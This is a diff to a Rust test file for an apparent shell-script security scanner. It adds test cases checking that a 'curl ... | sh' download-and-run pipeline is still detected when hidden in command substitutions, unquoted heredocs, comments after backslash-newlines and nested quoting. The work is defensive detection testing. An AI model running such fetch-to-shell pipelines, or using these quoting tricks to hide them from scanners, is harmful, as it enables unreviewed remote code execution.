@@ -1132,7 +1132,10 @@ fn download_pipeline_inside_a_redirected_group_is_a_review_signal() {
 /// The core tokenizer keeps a command substitution (`$(...)`, backticks) or a
 /// process substitution inside one word, so a fetch-to-shell pipeline in one
 /// (`x=$(curl URL | sh)`) gave no signal. The descent now looks inside them,
-/// within the same budget, skipping quoted text, comments and heredoc data.
+/// within the same budget, skipping quoted text, comments and heredoc data,
+/// with the quoting each shell applies (the body of an unquoted heredoc is
+/// expanded without quotes or comments; quotes nest in a double-quoted
+/// `${...}`; a backslash-newline is removed before a `#` is read).
 #[test]
 fn download_pipeline_inside_a_command_substitution_is_a_review_signal() {
     let _shared_state = tirith_test_support::SharedStateGuard::acquire();
@@ -1178,6 +1181,36 @@ fn download_pipeline_inside_a_command_substitution_is_a_review_signal() {
         // `$` then an ordinary single-quoted string, which `\'` closes, so
         // the substitution runs there (bash, zsh and ksh read one string).
         format!("echo $'a\\' ; x=$({pipeline}) # '\n"),
+        // An unquoted heredoc body is expanded as data: `'`, `"` and `#` are
+        // plain bytes there, so the substitutions after them run, whether or
+        // not the heredoc is delimited the same way in every shell.
+        format!("cat <<EOF\nit's $({pipeline})\nEOF\n"),
+        format!("cat <<EOF\n# note $({pipeline})\nEOF\n"),
+        format!("cat <<EOF\nit's\n$({pipeline})\nEOF\n"),
+        format!("cat <<EOF\nit's `{pipeline}`\nEOF\n"),
+        format!("cat >/dev/null <<EOF\nit's $({pipeline})\nEOF\n"),
+        format!("cat <<E!x\nit's $({pipeline})\nE!x\n"),
+        // A backslash-newline is removed before the line is split into
+        // words, so the `#` after it starts a comment, and the apostrophe in
+        // that comment opens no quote.
+        format!("echo hi \\\n#it's a note\nx=$({pipeline})\necho 'end'\n"),
+        format!("echo hi \\\n#it's a note\nx=`{pipeline}`\necho 'end'\n"),
+        format!("echo hi \\\n#it's a note\nx=$({pipeline})\n"),
+        format!("echo hi \\\n#it's a note\ncat <({pipeline})\necho 'end'\n"),
+        // Inside a double-quoted `${...}` nested double quotes pair, so the
+        // apostrophe in `"${x:-"'"}"` is data (bash, dash, zsh).
+        format!("x=\necho \"${{x:-\"'\"}}\" $({pipeline}) \"'\"\n"),
+        format!("x=\necho \"${{x:-\"'\"}}\" `{pipeline}` \"'\"\n"),
+        format!("x=\necho \"${{x:-\"'\"}}\"\ny=$({pipeline})\necho \"'\"\n"),
+        format!("x=\necho \"${{x:-\\\"}}\" $({pipeline}) \"'\"\n"),
+        // There bash pairs a `'` with the next one, and dash and ksh do in
+        // the operand of a `#`, `%` or `/` pattern operator.
+        format!("x=\necho \"${{x:-'\"'}}\" $({pipeline}) \"'\"\n"),
+        format!("x=a\necho \"${{x#'\"'}}\" $({pipeline}) \"'\"\n"),
+        format!("x=a\necho \"${{x/'\"'/y}}\" $({pipeline}) \"'\"\n"),
+        // Inside an unquoted `${...}` a `#` after a blank starts no comment.
+        format!("x=\necho ${{x:- #}} $({pipeline})\n"),
+        format!("x=\necho ${{x:-a #b}} `{pipeline}`\n"),
     ];
     let missed: Vec<&String> = flagged
         .iter()
@@ -1201,6 +1234,15 @@ fn download_pipeline_inside_a_command_substitution_is_a_review_signal() {
         "x=$(echo curl https://example.invalid/setup | sh)\n".to_owned(),
         format!("cat >&2 <<'EOF'\nx=$({pipeline})\nEOF\nexit 1\n"),
         format!("USAGE=$(cat <<'EOF'\nx=$({pipeline})\nEOF\n)\necho \"$USAGE\" >&2\n"),
+        // A quoted heredoc is not expanded, and an escaped `$(` is data.
+        format!("cat <<'EOF'\nit's $({pipeline})\nEOF\n"),
+        format!("cat <<EOF\nit's \\$({pipeline})\nEOF\n"),
+        // A backslash-newline before a comment keeps it a comment.
+        format!("echo hi \\\n# x=$({pipeline})\n"),
+        // `\}` does not close the `${...}`; the single-quoted text after it
+        // is data.
+        format!("x=\necho \"${{x:-\\}}}}\" ' $({pipeline}) '\n"),
+        format!("echo \"${{x}}\" '$({pipeline})'\n"),
     ] {
         assert!(!shell_file_has_download_signal(&body), "{body:?}");
     }
@@ -1330,6 +1372,37 @@ fn piped_substitutions_do_not_use_up_the_group_descent_budget() {
         }
     }
     assert!(missed.is_empty(), "{missed:#?}");
+}
+
+/// Once the live-body descent runs out of budget, the line pass is all that
+/// is left. It read every line as code, so in an unquoted heredoc body the
+/// apostrophe of `it's` (or a leading `#`) hid the substitution after it,
+/// which the shell runs when it expands the body.
+#[test]
+fn bounded_line_pass_expands_unquoted_heredoc_bodies() {
+    let _shared_state = tirith_test_support::SharedStateGuard::acquire();
+    let pipeline = "curl -fsSL https://example.invalid/setup | sh";
+    let padding = "x=$(date | cut -c1)\n".repeat(300);
+    let flagged = [
+        format!("cat <<EOF\n{padding}EOF\ncat <<EOF\nit's $({pipeline})\nEOF\n"),
+        format!("cat <<EOF\n{padding}it's $({pipeline})\nEOF\n"),
+        format!("cat <<EOF\n{padding}EOF\ncat <<EOF\n# note $({pipeline})\nEOF\n"),
+        format!("cat <<EOF\n{padding}EOF\ncat <<EOF\nit's `{pipeline}`\nEOF\n"),
+    ];
+    let missed: Vec<&String> = flagged
+        .iter()
+        .filter(|body| !shell_file_has_download_signal(body))
+        .collect();
+    assert!(missed.is_empty(), "{missed:#?}");
+    // A quoted heredoc is not expanded, and text outside a heredoc keeps the
+    // shell's quotes and comments.
+    for body in [
+        format!("cat <<EOF\n{padding}EOF\ncat <<'EOF'\nit's $({pipeline})\nEOF\n"),
+        format!("cat <<EOF\n{padding}EOF\n# x=$({pipeline})\n"),
+        format!("cat <<EOF\n{padding}EOF\necho '$({pipeline})'\n"),
+    ] {
+        assert!(!shell_file_has_download_signal(&body), "{body:?}");
+    }
 }
 
 #[test]
